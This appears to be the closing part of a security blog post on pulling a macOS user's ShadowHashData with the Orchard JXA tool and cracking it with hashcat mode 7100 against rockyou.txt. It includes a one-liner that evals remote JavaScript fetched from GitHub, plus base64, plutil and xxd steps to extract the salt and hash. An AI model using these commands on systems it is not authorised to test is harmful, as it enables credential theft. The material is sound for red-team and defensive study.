</span></span><span style="display:flex;"><span> 62706c69 <span style="color:#bd93f9">73743030</span> d2010203 0a5f101e 5352502d <span style="color:#bd93f9">52464335</span> 3035342d <span style="color:#bd93f9">34303936</span> 2d534841 3531322d 50424b44 46325f10 1453414c 5445442d <span style="color:#bd93f9">53484135</span> 31322d50 424b4446 32d30405 <span style="color:#bd93f9">06070809</span> <span style="color:#bd93f9">58766572</span> <span style="color:#bd93f9">69666965</span> <span style="color:#bd93f9">72547361</span> 6c745a69 <span style="color:#bd93f9">74657261</span> 74696f6e 734f1102 004350d6 29ecef1f 122a15ae ee030fa6 fa552525 6994b148 c9bdb3e0 bb652c88 0b82b334 4886ac55 9f04e045 bb494aea e73a5914 b68eb607 fd812f54 1c6ce2f5 c773be52 77c471bc 89df7ebd 0a0298b9 aa407330 e92816bf 732c10b0 09922f04 628fe872 b1b37778 0bd8221c d3487bee 42cf6a15 67802d13 4db26656 d0f2c17f 7c3ed954 c9fe56b8 615553a7 931ec655 4f526f5c c4541874 795b9b77 ce69d038 3380f493 c49d84ce 6e3f5d1c 0bb3df13 8bb379fb <span style="color:#bd93f9">99473936</span> 817ba675 0409b97d 7026ab75 3778473c a51926a2 b1745b72 <span style="color:#bd93f9">28285997</span> 524e7ef0 4821f41e f6e1979f 88c0a2c1 103773d4 cc69b5e5 0515be57 7c901e6b 3abae24f 7716b146 c3763881 d1c41f79 3dee9577 3f66f969 db2ab6bb 331bd518 438e1d56 1e314fa1 c78ea486 ff7f09db 5bb94565 5406ff15 597396cb 6b4832bf 2baab2e8 3f9ed76f e6c0e11a 130f5403 59c2b47c 33b78f4f 0b969805 47ff5030 149a94e7 37fcf4a4 1d6e1837 d31e26ff 6c4de92f 5c0bce93 d9498299 a0d15668 2557da09 748c24a0 c20bc995 8b119c85 92f8c319 f17ac5c8 6631b9d8 11803fb6 ca2af51b 3ab52af7 354f61e1 87dcc684 <span style="color:#bd93f9">57259217</span> 32343cdd 200ec9bd fdb38f6a 3ffb135c 3d095b3d e40ac620 a3975056 ca8ee84a 175198b0 8c471e54 d2637140 eaaf40a8 673c8f70 b5fc4033 77a46b8b 0c65a69f 3817b8de fa028a7c 146705d6 1000652c dd4a6dce bf0d7aaf 2a4f1020 ba98c293 c1461cf9 c4df9952 569b14b9 1ff176e0 eddaee7c a4583f2d 097287c1 1200022e 09d30b05 060c0d09 57656e74 726f7079 4f1080e9 a36c9b06 438acd06 8982b946 ffa90aac e01574e3 cf98628c 4348784e 1630f0de 9e018c55 77d5d376 cc335136 57d3a593 e1fa565c 53b4a3fd 7dc1599e 2e60b3e1 f815a1d2 612f86cf 6e26d143 a0f202cc 5c0182a9 ea973682 cfd7859e 82ebc85b abdc8be1 845d26ce bb4a3594 f1654b86 e8476c4e 7d566916 0ae8c052 3491a94f 10205a83 6c31ba4a a34077d9 <span style="color:#bd93f9">67368267</span> d314ddfa 2808e96e 6b58119a 26df3f67 c8c40008 000d002e 0045004c 0055005a <span style="color:#bd93f9">00650269</span> 028c0291 029802a0 <span style="color:#bd93f9">03230000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">02010000</span> <span style="color:#bd93f9">00000000</span> 000e0000 <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">0346</span>
</span></span></code></pre></div><p>this contains the hashing algorithm (like PBKDF2), the number of iterations, the salt, and <strong>entropy</strong> (i.e. the actual hashed password.)</p>
<p>you can attempt to crack this using <code>hashcat</code>, with the form <code>$ml$[iterations]$[salt]$[entropy]</code>, but this will be painfully slow.</p>
<p>instead, we can use <a href="https://github.com/its-a-feature/Orchard/blob/master/Orchard.js"  target="_blank" rel="noreferrer nofollow">Orchard</a>
 to leverage JXA (JavaScript for Automation) to do some enumeration.</p>
<p>set up a scripting environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ osascript -l JavaScript -i
</span></span></code></pre></div><p>then enter the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">eval</span>(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(<span style="color:#f1fa8c">&#39;https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js&#39;</span>)),$.NSUTF8StringEncoding)));
</span></span></code></pre></div><p>you can now call functions inside this environment. for example, i want to get my local user data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>Get_LocalUser({user<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;bilal&#34;</span>})
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/shadow.png" alt="alt text"  />
</p>
</p>
<p>the output here is massive. i&rsquo;m interested in <code>dsAttrTypeNative:ShadowHashData</code>, which manifests as a base64 blob. it&rsquo;s easier to save the output to a file, then <code>grep</code> it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>Get_LocalUser({user<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;bilal&#34;</span>}) <span style="color:#ff79c6">&gt;</span> user_data.json
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -A1 <span style="color:#f1fa8c">&#34;dsAttrTypeNative:ShadowHashData&#34;</span> user_data.json
</span></span></code></pre></div><p>once you collect the base64 blob above, feed it into the command below and decode it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> &lt;blob&gt; | base64 -D &gt; shadowhash.bplist
</span></span></code></pre></div><p>convert the <code>plist</code> to XML.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plutil -convert xml1 shadowhash.bplist
</span></span></code></pre></div><p>we&rsquo;ll need the salt (<code>SALTED-SHA512-PBKDF2</code>) and entropy sections, and in hex, so let&rsquo;s convert them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> &lt;salt&gt; | base64 -D &gt; salt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xxd -p salt | tr -d <span style="color:#f1fa8c">&#39;\n&#39;</span>
</span></span></code></pre></div><p>now that we have all the parts, create a hash file for cracking. remember the format: <code>$ml$iterations$salt$entropy</code>.</p>
<p>the hashcat command to crack the password is simple, and all you need is a reliable password list (<code>rockyou.txt</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#bd93f9">7100</span> &lt;hash-file&gt; ~/tools/rockyou.txt
</span></span></code></pre></div></main>





<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/minidump-types/" style="float: right"
      >next: advanced evasions, part 2: implementing minidump structures</a
    >
     
    <a class="previous" href="/posts/new_post20/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>